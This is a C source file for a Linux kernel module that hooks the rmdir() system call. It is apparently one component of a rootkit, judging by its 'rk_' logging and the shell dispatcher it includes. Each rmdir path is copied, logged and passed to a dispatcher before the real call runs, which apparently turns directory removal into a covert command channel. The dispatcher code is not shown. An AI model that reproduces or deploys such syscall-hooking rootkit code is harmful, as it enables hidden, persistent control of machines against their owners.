#include <linux/module.h>
#include <linux/slab.h>
#include <linux/namei.h>
#include <linux/fs.h>
#include <linux/uaccess.h>

// ////////////////////////////////////////////////////////////////////
// ////////////////////////////////////////////////////////////////////

#include "../../logger/logger.h"
#include "../../shell/dispatcher.h"
#include "../utils.h"
#include "rmdir.h"

#include <linux/mm.h>

// ////////////////////////////////////////////////////////////////////
// ////////////////////////////////////////////////////////////////////

asmlinkage long (*real_rmdir)(const struct pt_regs *);

// ////////////////////////////////////////////////////////////////////

asmlinkage long hook_rmdir(const struct pt_regs *regs) {
    const void *pathname = SYSCALL_ARG1(regs, void *);
    char *kernel_filename = duplicate_filename(pathname);

    rk_info("[hook_rmdir] rmdir() hooked for: %s\n", kernel_filename);

    dispatcher(regs, kernel_filename);
    const long ret = real_rmdir(regs);

    kfree(kernel_filename);

    return ret;
}

// ////////////////////////////////////////////////////////////////////
// ////////////////////////////////////////////////////////////////////

EXPORT_SYMBOL(hook_rmdir);
EXPORT_SYMBOL(real_rmdir);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Aspheric_");
MODULE_DESCRIPTION("Hooks rmdir");
